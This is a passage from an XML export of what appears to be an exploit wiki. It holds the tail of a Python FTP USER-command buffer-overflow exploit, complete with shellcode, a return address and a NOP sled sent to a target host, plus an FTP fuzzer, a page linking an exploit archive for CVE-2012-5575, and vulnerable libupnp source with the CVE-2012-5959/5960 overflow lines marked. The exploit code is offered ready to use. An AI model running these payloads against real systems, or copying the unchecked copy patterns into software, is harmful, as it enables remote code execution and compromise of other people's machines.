"\xfc\x31\x76\x6e\xa6\xb2\x20\x4a\x56\x16\xb6\x19\x54\xd3\xbc"
"\x45\x79\xe2\x11\xfe\x85\x6f\x94\xd0\x0f\x2b\xb3\xf4\x54\xef"
"\xda\xad\x30\x5e\xe2\xad\x9a\x3f\x46\xa6\x37\x2b\xfb\xe5\x5f"
"\x98\x36\x15\xa0\xb6\x41\x66\x92\x19\xfa\xe0\x9e\xd2\x24\xf7"
"\xe1\xc8\x91\x67\x1c\xf3\xe1\xae\xdb\xa7\xb1\xd8\xca\xc7\x59"
"\x18\xf2\x1d\xcd\x48\x5c\xce\xae\x38\x1c\xbe\x46\x52\x93\xe1"
"\x77\x5d\x79\x8a\x12\xa4\xea\x75\x4a\xa7\x93\x1d\x89\xa7\x62"
"\x65\x04\x41\x0e\x89\x41\xda\xa7\x30\xc8\x90\x56\xbc\xc6\xdd"
"\x59\x36\xe5\x22\x17\xbf\x80\x30\xc0\x4f\xdf\x6a\x47\x4f\xf5"
"\x02\x0b\xc2\x92\xd2\x42\xff\x0c\x85\x03\x31\x45\x43\xbe\x68"
"\xff\x71\x43\xec\x38\x31\x98\xcd\xc7\xb8\x6d\x69\xec\xaa\xab"
"\x72\xa8\x9e\x63\x25\x66\x48\xc2\x9f\xc8\x22\x9c\x4c\x83\xa2"
"\x59\xbf\x14\xb4\x65\xea\xe2\x58\xd7\x43\xb3\x67\xd8\x03\x33"
"\x10\x04\xb4\xbc\xcb\x8c\xd4\x5e\xd9\xf8\x7c\xc7\x88\x40\xe1"
"\xf8\x67\x86\x1c\x7b\x8d\x77\xdb\x63\xe4\x72\xa7\x23\x15\x0f"
"\xb8\xc1\x19\xbc\xb9\xc3")

buffer = "A" * 230 + "\xdb\x99\x46\x77" + "\x90" * 20 + shellcode + "C" * (800-230-351-16)

try:
	print "\nSending evil buffer..."
	s.connect(("192.168.1.131", 21))
	s.recv(1024)
	s.send('USER ' + buffer + '\r\n')
	data = s.recv(1024)
	print "\nDone!."
except:
	print "Could not connect to FTP!"


&lt;/pre&gt;


===ftp-user-fuzz.py===
&lt;pre&gt;
#!/usr/bin/python

import socket



buffer = ["A"]
counter=100

while len(buffer) &lt; 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing USER with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(("192.168.1.131", 21))
	s.recv(1024)
	s.send('USER ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()


&lt;/pre&gt;</text>
      <sha1>kbw3n5qverle8hfrp1t8bra64n82n59</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-5575 Apache CXF XML漏洞</title>
    <ns>0</ns>
    <id>739</id>
    <revision>
      <id>981</id>
      <timestamp>2021-04-04T06:27:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-5575.zip"</comment>
      <origin>981</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="by9cbwsdkqhnk8m9at7bsyiqwlxm3y3" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-5575.zip</text>
      <sha1>by9cbwsdkqhnk8m9at7bsyiqwlxm3y3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-5960 libupnp緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>740</id>
    <revision>
      <id>982</id>
      <timestamp>2021-04-04T06:32:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "===ssdp_server(libupnp_1.6.13).c=== &lt;pre&gt; /**************************************************************************  *  * Copyright (c) 2000-2003 Intel Corporation  * All ri..."</comment>
      <origin>982</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="36979" sha1="myc8bpwbt3wbm9xefhyel1qlc7f2mm7" xml:space="preserve">===ssdp_server(libupnp_1.6.13).c===
&lt;pre&gt;
/**************************************************************************
 *
 * Copyright (c) 2000-2003 Intel Corporation
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * - Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 * - Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 * - Neither name of Intel Corporation nor the names of its contributors
 * may be used to endorse or promote products derived from this software
 * without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL INTEL OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY
 * OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 **************************************************************************/

/*!
 * \addtogroup SSDPlib
 *
 * @{
 *
 * \file
 */

#ifndef WIN32
	#include &lt;sys/param.h&gt;
#endif /* WIN32 */

#include "config.h"

#if EXCLUDE_SSDP == 0

#include "ssdplib.h"

#include "httpparser.h"
#include "httpreadwrite.h"
#include "membuffer.h"
#include "miniserver.h"
#include "sock.h"
#include "ThreadPool.h"
#include "upnpapi.h"

#include &lt;stdio.h&gt;

#define MAX_TIME_TOREAD  45

#ifdef INCLUDE_CLIENT_APIS
	SOCKET gSsdpReqSocket4 = INVALID_SOCKET;
	#ifdef UPNP_ENABLE_IPV6
		SOCKET gSsdpReqSocket6 = INVALID_SOCKET;
	#endif /* UPNP_ENABLE_IPV6 */
#endif /* INCLUDE_CLIENT_APIS */

void RequestHandler();

enum Listener {
	Idle,
	Stopping,
	Running
};

struct SSDPSockArray {
	/*! socket for incoming advertisments and search requests */
	SOCKET ssdpSock;
#ifdef INCLUDE_CLIENT_APIS
	/*! socket for sending search requests and receiving search replies */
	int ssdpReqSock;
#endif /* INCLUDE_CLIENT_APIS */
};

#ifdef INCLUDE_DEVICE_APIS
static const char SERVICELIST_STR[] = "serviceList";

int AdvertiseAndReply(int AdFlag, UpnpDevice_Handle Hnd,
		      enum SsdpSearchType SearchType,
		      struct sockaddr *DestAddr, char *DeviceType,
		      char *DeviceUDN, char *ServiceType, int Exp)
{
	int retVal = UPNP_E_SUCCESS;
	long unsigned int i;
	long unsigned int j;
	int defaultExp = DEFAULT_MAXAGE;
	struct Handle_Info *SInfo = NULL;
	char UDNstr[100];
	char devType[100];
	char servType[100];
	IXML_NodeList *nodeList = NULL;
	IXML_NodeList *tmpNodeList = NULL;
	IXML_Node *tmpNode = NULL;
	IXML_Node *tmpNode2 = NULL;
	IXML_Node *textNode = NULL;
	const DOMString tmpStr;
	char SERVER[200];
	const DOMString dbgStr;
	int NumCopy = 0;

	UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
		   "Inside AdvertiseAndReply with AdFlag = %d\n", AdFlag);

	/* Use a read lock */
	HandleReadLock();
	if (GetHandleInfo(Hnd, &amp;SInfo) != HND_DEVICE) {
		retVal = UPNP_E_INVALID_HANDLE;
		goto end_function;
	}
	defaultExp = SInfo-&gt;MaxAge;
	/* get server info */
	get_sdk_info(SERVER);
	/* parse the device list and send advertisements/replies */
	while (NumCopy == 0 || (AdFlag &amp;&amp; NumCopy &lt; NUM_SSDP_COPY)) {
		if (NumCopy != 0)
			imillisleep(SSDP_PAUSE);
		NumCopy++;
		for (i = 0;; i++) {
			UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
				   "Entering new device list with i = %lu\n\n",
				   i);
			tmpNode = ixmlNodeList_item(SInfo-&gt;DeviceList, i);
			if (!tmpNode) {
				UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
					   "Exiting new device list with i = %lu\n\n",
					   i);
				break;
			}
			dbgStr = ixmlNode_getNodeName(tmpNode);
			UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
				   "Extracting device type once for %s\n",
				   dbgStr);
			ixmlNodeList_free(nodeList);
			nodeList = ixmlElement_getElementsByTagName((IXML_Element *) tmpNode, "deviceType");
			if (!nodeList)
				continue;
			UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
				   "Extracting UDN for %s\n", dbgStr);
			dbgStr = ixmlNode_getNodeName(tmpNode);
			UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
				   "Extracting device type\n");
			tmpNode2 = ixmlNodeList_item(nodeList, 0);
			if (!tmpNode2)
				continue;
			textNode = ixmlNode_getFirstChild(tmpNode2);
			if (!textNode)
				continue;
			UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
				   "Extracting device type \n");
			tmpStr = ixmlNode_getNodeValue(textNode);
			if (!tmpStr)
				continue;
			strcpy(devType, tmpStr);
			UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
				   "Extracting device type = %s\n", devType);
			if (!tmpNode) {
				UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
					   "TempNode is NULL\n");
			}
			dbgStr = ixmlNode_getNodeName(tmpNode);
			UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
				   "Extracting UDN for %s\n", dbgStr);
			ixmlNodeList_free(nodeList);
			nodeList = ixmlElement_getElementsByTagName((IXML_Element *) tmpNode, "UDN");
			if (!nodeList) {
				UpnpPrintf(UPNP_CRITICAL, API, __FILE__,
					   __LINE__, "UDN not found!\n");
				continue;
			}
			tmpNode2 = ixmlNodeList_item(nodeList, 0);
			if (!tmpNode2) {
				UpnpPrintf(UPNP_CRITICAL, API, __FILE__,
					   __LINE__, "UDN not found!\n");
				continue;
			}
			textNode = ixmlNode_getFirstChild(tmpNode2);
			if (!textNode) {
				UpnpPrintf(UPNP_CRITICAL, API, __FILE__,
					   __LINE__, "UDN not found!\n");
				continue;
			}
			tmpStr = ixmlNode_getNodeValue(textNode);
			if (!tmpStr) {
				UpnpPrintf(UPNP_CRITICAL, API, __FILE__,
					   __LINE__, "UDN not found!\n");
				continue;
			}
			strcpy(UDNstr, tmpStr);
			UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
				   "Sending UDNStr = %s \n", UDNstr);
			if (AdFlag) {
				/* send the device advertisement */
				if (AdFlag == 1) {
					DeviceAdvertisement(devType, i == 0,
							    UDNstr,
							    SInfo-&gt;DescURL, Exp,
							    SInfo-&gt;DeviceAf);
				} else {
					/* AdFlag == -1 */
					DeviceShutdown(devType, i == 0, UDNstr,
						       SERVER, SInfo-&gt;DescURL,
						       Exp, SInfo-&gt;DeviceAf);
				}
			} else {
				switch (SearchType) {
				case SSDP_ALL:
					DeviceReply(DestAddr, devType, i == 0,
						    UDNstr, SInfo-&gt;DescURL,
						    defaultExp);
					break;
				case SSDP_ROOTDEVICE:
					if (i == 0) {
						SendReply(DestAddr, devType, 1,
							  UDNstr,
							  SInfo-&gt;DescURL,
							  defaultExp, 0);
					}
					break;
				case SSDP_DEVICEUDN: {
					if (DeviceUDN &amp;&amp; strlen(DeviceUDN) != 0) {
						if (strcasecmp(DeviceUDN, UDNstr)) {
							UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
								"DeviceUDN=%s and search UDN=%s DID NOT match\n",
								UDNstr, DeviceUDN);
							break;
						} else {
							UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
								"DeviceUDN=%s and search UDN=%s MATCH\n",
								UDNstr, DeviceUDN);
							SendReply(DestAddr, devType, 0, UDNstr, SInfo-&gt;DescURL, defaultExp, 0);
							break;
						}
					}
				}
				case SSDP_DEVICETYPE: {
					if (!strncasecmp(DeviceType, devType, strlen(DeviceType) - 2)) {
						if (atoi(strrchr(DeviceType, ':') + 1)
						    &lt; atoi(&amp;devType[strlen(devType) - 1])) {
							/* the requested version is lower than the device version
							 * must reply with the lower version number and the lower
							 * description URL */
							UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
								   "DeviceType=%s and search devType=%s MATCH\n",
								   devType, DeviceType);
							SendReply(DestAddr, DeviceType, 0, UDNstr, SInfo-&gt;LowerDescURL,
								  defaultExp, 1);
						} else if (atoi(strrchr(DeviceType, ':') + 1)
							   == atoi(&amp;devType[strlen(devType) - 1])) {
							UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
								   "DeviceType=%s and search devType=%s MATCH\n",
								   devType, DeviceType);
							SendReply(DestAddr, DeviceType, 0, UDNstr, SInfo-&gt;DescURL,
								  defaultExp, 1);
						} else {
							UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
								   "DeviceType=%s and search devType=%s DID NOT MATCH\n",
								   devType, DeviceType);
						}
					} else {
						UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
							   "DeviceType=%s and search devType=%s DID NOT MATCH\n",
							   devType, DeviceType);
					}
					break;
				}
				default:
					break;
				}
			}
			/* send service advertisements for services corresponding
			 * to the same device */
			UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
				   "Sending service Advertisement\n");
			/* Correct service traversal such that each device's serviceList
			 * is directly traversed as a child of its parent device. This
			 * ensures that the service's alive message uses the UDN of
			 * the parent device. */
			tmpNode = ixmlNode_getFirstChild(tmpNode);
			while (tmpNode) {
				dbgStr = ixmlNode_getNodeName(tmpNode);
				if (!strncmp
				    (dbgStr, SERVICELIST_STR,
				     sizeof SERVICELIST_STR)) {
					break;
				}
				tmpNode = ixmlNode_getNextSibling(tmpNode);
			}
			ixmlNodeList_free(nodeList);
			if (!tmpNode) {
				nodeList = NULL;
				continue;
			}
			nodeList = ixmlElement_getElementsByTagName((IXML_Element *) tmpNode, "service");
			if (!nodeList) {
				UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
					   "Service not found 3\n");
				continue;
			}
			for (j = 0;; j++) {
				tmpNode = ixmlNodeList_item(nodeList, j);
				if (!tmpNode) {
					break;
				}
				ixmlNodeList_free(tmpNodeList);
				tmpNodeList = ixmlElement_getElementsByTagName((IXML_Element *) tmpNode, "serviceType");
				if (!tmpNodeList) {
					UpnpPrintf(UPNP_CRITICAL, API, __FILE__,
						   __LINE__,
						   "ServiceType not found \n");
					continue;
				}
				tmpNode2 = ixmlNodeList_item(tmpNodeList, 0);
				if (!tmpNode2)
					continue;
				textNode = ixmlNode_getFirstChild(tmpNode2);
				if (!textNode)
					continue;
				/* servType is of format Servicetype:ServiceVersion */
				tmpStr = ixmlNode_getNodeValue(textNode);
				if (!tmpStr)
					continue;
				strcpy(servType, tmpStr);
				UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
					   "ServiceType = %s\n", servType);
				if (AdFlag) {
					if (AdFlag == 1) {
						ServiceAdvertisement(UDNstr,
							servType, SInfo-&gt;DescURL,
							Exp, SInfo-&gt;DeviceAf);
					} else {
						/* AdFlag == -1 */
						ServiceShutdown(UDNstr,
							servType, SInfo-&gt;DescURL,
							Exp, SInfo-&gt;DeviceAf);
					}
				} else {
					switch (SearchType) {
					case SSDP_ALL:
						ServiceReply(DestAddr, servType,
							     UDNstr,
							     SInfo-&gt;DescURL,
							     defaultExp);
						break;
					case SSDP_SERVICE:
						if (ServiceType) {
							if (!strncasecmp(ServiceType, servType, strlen(ServiceType) - 2)) {
								if (atoi(strrchr(ServiceType, ':') + 1) &lt;
								    atoi(&amp;servType[strlen(servType) - 1])) {
									/* the requested version is lower than the service version
									 * must reply with the lower version number and the lower
									 * description URL */
									UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
										   "ServiceType=%s and search servType=%s MATCH\n",
										   ServiceType, servType);
									SendReply(DestAddr, ServiceType, 0, UDNstr, SInfo-&gt;LowerDescURL,
										  defaultExp, 1);
								} else if (atoi(strrchr (ServiceType, ':') + 1) ==
									   atoi(&amp;servType[strlen(servType) - 1])) {
									UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
										   "ServiceType=%s and search servType=%s MATCH\n",
										   ServiceType, servType);
									SendReply(DestAddr, ServiceType, 0, UDNstr, SInfo-&gt;DescURL,
										  defaultExp, 1);
								} else {
									UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
									   "ServiceType=%s and search servType=%s DID NOT MATCH\n",
									   ServiceType, servType);
								}
							} else {
								UpnpPrintf(UPNP_INFO, API, __FILE__, __LINE__,
									   "ServiceType=%s and search servType=%s DID NOT MATCH\n",
									   ServiceType, servType);
							}
						}
						break;
					default:
						break;
					}
				}
			}
			ixmlNodeList_free(tmpNodeList);
			tmpNodeList = NULL;
			ixmlNodeList_free(nodeList);
			nodeList = NULL;
		}
	}

end_function:
	ixmlNodeList_free(tmpNodeList);
	ixmlNodeList_free(nodeList);
	UpnpPrintf(UPNP_ALL, API, __FILE__, __LINE__,
		   "Exiting AdvertiseAndReply.\n");
	HandleUnlock();

	return retVal;
}
#endif /* INCLUDE_DEVICE_APIS */

int unique_service_name(char *cmd, SsdpEvent *Evt)
{
	char TempBuf[COMMAND_LEN];
	char *TempPtr = NULL;
	char *Ptr = NULL;
	char *ptr1 = NULL;
	char *ptr2 = NULL;
	char *ptr3 = NULL;
	int CommandFound = 0;
	size_t n = 0;

	if ((TempPtr = strstr(cmd, "uuid:schemas")) != NULL) {
		ptr1 = strstr(cmd, ":device");
		if (ptr1 != NULL)
			ptr2 = strstr(ptr1 + 1, ":");
		else
			return -1;
		if (ptr2 != NULL)
			ptr3 = strstr(ptr2 + 1, ":");
		else
			return -1;
		if (ptr3 != NULL)
			sprintf(Evt-&gt;UDN, "uuid:%s", ptr3 + 1);
		else
			return -1;
		ptr1 = strstr(cmd, ":");
		if (ptr1 != NULL) {
			n = (size_t) (ptr3 - ptr1);
			strncpy(TempBuf, ptr1, n);
			TempBuf[n] = '\0';
			sprintf(Evt-&gt;DeviceType, "urn%s", TempBuf);
		} else
			return -1;
		return 0;
	}
	if ((TempPtr = strstr(cmd, "uuid")) != NULL) {
		if ((Ptr = strstr(cmd, "::")) != NULL) {
			n = (size_t) (Ptr - TempPtr);
			strncpy(Evt-&gt;UDN, TempPtr, n);	// CVE-2012-5959
			Evt-&gt;UDN[n] = '\0';
		} else
			strcpy(Evt-&gt;UDN, TempPtr);
		CommandFound = 1;
	}
	if (strstr(cmd, "urn:") != NULL &amp;&amp; strstr(cmd, ":service:") != NULL) {
		if ((TempPtr = strstr(cmd, "urn")) != NULL) {
			strcpy(Evt-&gt;ServiceType, TempPtr);
			CommandFound = 1;
		}
	}
	if (strstr(cmd, "urn:") != NULL &amp;&amp; strstr(cmd, ":device:") != NULL) {
		if ((TempPtr = strstr(cmd, "urn")) != NULL) {
			strcpy(Evt-&gt;DeviceType, TempPtr);
			CommandFound = 1;
		}
	}
	if ((TempPtr = strstr(cmd, "::upnp:rootdevice")) != NULL) {
		/* Everything before "::upnp::rootdevice" is the UDN. */
		if (TempPtr != cmd) {
			n = (size_t) (TempPtr - cmd);
			strncpy(Evt-&gt;UDN, cmd, n);	// CVE-2012-5960
			Evt-&gt;UDN[n] = 0;
			CommandFound = 1;
		}
	}
	if (CommandFound == 0)
		return -1;

	return 0;
}

enum SsdpSearchType ssdp_request_type1(char *cmd)
{
	if (strstr(cmd, ":all"))
		return SSDP_ALL;
	if (strstr(cmd, ":rootdevice"))
		return SSDP_ROOTDEVICE;
	if (strstr(cmd, "uuid:"))
		return SSDP_DEVICEUDN;
	if (strstr(cmd, "urn:") &amp;&amp; strstr(cmd, ":device:"))
		return SSDP_DEVICETYPE;
	if (strstr(cmd, "urn:") &amp;&amp; strstr(cmd, ":service:"))
		return SSDP_SERVICE;
	return SSDP_SERROR;
}

int ssdp_request_type(char *cmd, SsdpEvent *Evt)
{
	/* clear event */
	memset(Evt, 0, sizeof(SsdpEvent));
	unique_service_name(cmd, Evt);
	Evt-&gt;ErrCode = NO_ERROR_FOUND;
	if ((Evt-&gt;RequestType = ssdp_request_type1(cmd)) == SSDP_SERROR) {
		Evt-&gt;ErrCode = E_HTTP_SYNTEX;
		return -1;
	}
	return 0;
}

/*!
 * \brief Frees the ssdp request.
 */
static void free_ssdp_event_handler_data(
	/*! [in] ssdp_thread_data structure. This structure contains SSDP
	 * request message. */
	void *the_data)
{
	ssdp_thread_data *data = (ssdp_thread_data *) the_data;

	if (data != NULL) {
		http_message_t *hmsg = &amp;data-&gt;parser.msg;
		/* free data */
		httpmsg_destroy(hmsg);
		free(data);
	}
}

/*!
 * \brief Does some quick checking of the ssdp msg.
 *
 * \return TRUE if msg is valid, else FALSE.
 */
static UPNP_INLINE int valid_ssdp_msg(
	/*! [in] ssdp_thread_data structure. This structure contains SSDP
	 * request message. */
	http_message_t * hmsg)
{
	memptr hdr_value;

	/* check for valid methods - NOTIFY or M-SEARCH */
	if (hmsg-&gt;method != HTTPMETHOD_NOTIFY &amp;&amp;
	    hmsg-&gt;method != HTTPMETHOD_MSEARCH &amp;&amp;
	    hmsg-&gt;request_method != HTTPMETHOD_MSEARCH) {
		return FALSE;
	}
	if (hmsg-&gt;request_method != HTTPMETHOD_MSEARCH) {
		/* check PATH == "*" */
		if (hmsg-&gt;uri.type != RELATIVE ||
		    strncmp("*", hmsg-&gt;uri.pathquery.buff,
			    hmsg-&gt;uri.pathquery.size) != 0) {
			return FALSE;
		}
		/* check HOST header */
		if (httpmsg_find_hdr(hmsg, HDR_HOST, &amp;hdr_value) == NULL ||
		    (memptr_cmp(&amp;hdr_value, "239.255.255.250:1900") != 0 &amp;&amp;
		     memptr_cmp(&amp;hdr_value, "[FF02::C]:1900") != 0 &amp;&amp;
		     memptr_cmp(&amp;hdr_value, "[ff02::c]:1900") != 0 &amp;&amp;
		     memptr_cmp(&amp;hdr_value, "[FF05::C]:1900") != 0 &amp;&amp;
		     memptr_cmp(&amp;hdr_value, "[ff05::c]:1900") != 0)) {
			UpnpPrintf(UPNP_INFO, SSDP, __FILE__, __LINE__,
				   "Invalid HOST header from SSDP message\n");

			return FALSE;
		}
	}

	/* passed quick check */
	return TRUE;
}

/*!
 * \brief Parses the message and dispatches it to a handler which handles the
 * ssdp request msg.
 *
 * \return 0 if successful, -1 if error.
 */
static UPNP_INLINE int start_event_handler(
	/*! [in] ssdp_thread_data structure. This structure contains SSDP
	 * request message. */
	void *Data)
{
	http_parser_t *parser = NULL;
	parse_status_t status;
	ssdp_thread_data *data = (ssdp_thread_data *) Data;

	parser = &amp;data-&gt;parser;
	status = parser_parse(parser);
	if (status == PARSE_FAILURE) {
		if (parser-&gt;msg.method != HTTPMETHOD_NOTIFY ||
		    !parser-&gt;valid_ssdp_notify_hack) {
			UpnpPrintf(UPNP_INFO, SSDP, __FILE__, __LINE__,
				   "SSDP recvd bad msg code = %d\n", status);
			/* ignore bad msg, or not enuf mem */
			goto error_handler;
		}
		/* valid notify msg */
	} else if (status != PARSE_SUCCESS) {
		UpnpPrintf(UPNP_INFO, SSDP, __FILE__, __LINE__,
			   "SSDP recvd bad msg code = %d\n", status);

		goto error_handler;
	}
	/* check msg */
	if (valid_ssdp_msg(&amp;parser-&gt;msg) != TRUE) {
		goto error_handler;
	}
	/* done; thread will free 'data' */
	return 0;

 error_handler:
	free_ssdp_event_handler_data(data);
	return -1;
}

/*!
 * \brief This function is a thread that handles SSDP requests.
 */
static void ssdp_event_handler_thread(
	/*! [] ssdp_thread_data structure. This structure contains SSDP
	 * request message. */
	void *the_data)
{
	ssdp_thread_data *data = (ssdp_thread_data *) the_data;
	http_message_t *hmsg = &amp;data-&gt;parser.msg;

	if (start_event_handler(the_data) != 0)
		return;
	/* send msg to device or ctrlpt */
	if (hmsg-&gt;method == HTTPMETHOD_NOTIFY ||
	    hmsg-&gt;request_method == HTTPMETHOD_MSEARCH) {
#ifdef INCLUDE_CLIENT_APIS
		ssdp_handle_ctrlpt_msg(hmsg,
				       &amp;data-&gt;dest_addr,
				       FALSE, NULL);
#endif /* INCLUDE_CLIENT_APIS */
	} else {
		ssdp_handle_device_request(hmsg,
					   &amp;data-&gt;dest_addr);
	}

	/* free data */
	free_ssdp_event_handler_data(data);
}

void readFromSSDPSocket(SOCKET socket)
{
	char *requestBuf = NULL;
	char staticBuf[BUFSIZE];
	struct sockaddr_storage __ss;
	ThreadPoolJob job;
	ssdp_thread_data *data = NULL;
	socklen_t socklen = sizeof(__ss);
	ssize_t byteReceived = 0;
	char ntop_buf[64];

	requestBuf = staticBuf;
	/* in case memory can't be allocated, still drain the socket using a
	 * static buffer. */
	data = malloc(sizeof(ssdp_thread_data));
	if (data) {
		/* initialize parser */
#ifdef INCLUDE_CLIENT_APIS
		if (socket == gSsdpReqSocket4
	#ifdef UPNP_ENABLE_IPV6
		    || socket == gSsdpReqSocket6
	#endif /* UPNP_ENABLE_IPV6 */
		    )
			parser_response_init(&amp;data-&gt;parser, HTTPMETHOD_MSEARCH);
		else
			parser_request_init(&amp;data-&gt;parser);
#else /* INCLUDE_CLIENT_APIS */
		parser_request_init(&amp;data-&gt;parser);
#endif /* INCLUDE_CLIENT_APIS */
		/* set size of parser buffer */
		if (membuffer_set_size(&amp;data-&gt;parser.msg.msg, BUFSIZE) == 0)
			/* use this as the buffer for recv */
			requestBuf = data-&gt;parser.msg.msg.buf;
		else {
			free(data);
			data = NULL;
		}
	}
	byteReceived = recvfrom(socket, requestBuf, BUFSIZE - 1, 0,
				(struct sockaddr *)&amp;__ss, &amp;socklen);
	if (byteReceived &gt; 0) {
		requestBuf[byteReceived] = '\0';
		if (__ss.ss_family == AF_INET)
			inet_ntop(AF_INET,
				  &amp;((struct sockaddr_in *)&amp;__ss)-&gt;sin_addr,
				  ntop_buf, sizeof(ntop_buf));
#ifdef UPNP_ENABLE_IPV6
		else if (__ss.ss_family == AF_INET6)
			inet_ntop(AF_INET6,
				  &amp;((struct sockaddr_in6 *)&amp;__ss)-&gt;sin6_addr,
				  ntop_buf, sizeof(ntop_buf));
#endif /* UPNP_ENABLE_IPV6 */
		else
			strncpy(ntop_buf, "&lt;Invalid address family&gt;",
				sizeof(ntop_buf));
		UpnpPrintf(UPNP_INFO, SSDP, __FILE__, __LINE__,
			   "Start of received response ----------------------------------------------------\n"
			   "%s\n"
			   "End of received response ------------------------------------------------------\n"
			   "From host %s\n", requestBuf, ntop_buf);
		/* add thread pool job to handle request */
		if (data != NULL) {
			data-&gt;parser.msg.msg.length += (size_t) byteReceived;
			/* null-terminate */
			data-&gt;parser.msg.msg.buf[byteReceived] = 0;
			memcpy(&amp;data-&gt;dest_addr, &amp;__ss, sizeof(__ss));
			TPJobInit(&amp;job, (start_routine)
				  ssdp_event_handler_thread, data);
			TPJobSetFreeFunction(&amp;job,
					     free_ssdp_event_handler_data);
			TPJobSetPriority(&amp;job, MED_PRIORITY);
			if (ThreadPoolAdd(&amp;gRecvThreadPool, &amp;job, NULL) != 0)
				free_ssdp_event_handler_data(data);
		}
	} else
		free_ssdp_event_handler_data(data);
}

/*!
 * \brief
 */
static int create_ssdp_sock_v4(
	/*! [] SSDP IPv4 socket to be created. */
	SOCKET *ssdpSock)
{
	char errorBuffer[ERROR_BUFFER_LEN];
	int onOff;
	u_char ttl = 4;
	struct ip_mreq ssdpMcastAddr;
	struct sockaddr_storage __ss;
	struct sockaddr_in *ssdpAddr4 = (struct sockaddr_in *)&amp;__ss;
	int ret = 0;
	struct in_addr addr;

	*ssdpSock = socket(AF_INET, SOCK_DGRAM, 0);
	if (*ssdpSock == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in socket(): %s\n", errorBuffer);

		return UPNP_E_OUTOF_SOCKET;
	}
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_REUSEADDR,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_REUSEADDR: %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
#if defined(BSD) || defined(__OSX__) || defined(__APPLE__)
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_REUSEPORT,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_REUSEPORT: %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
#endif /* BSD, __OSX__, __APPLE__ */
	memset(&amp;__ss, 0, sizeof(__ss));
	ssdpAddr4-&gt;sin_family = AF_INET;
	ssdpAddr4-&gt;sin_addr.s_addr = htonl(INADDR_ANY);
	ssdpAddr4-&gt;sin_port = htons(SSDP_PORT);
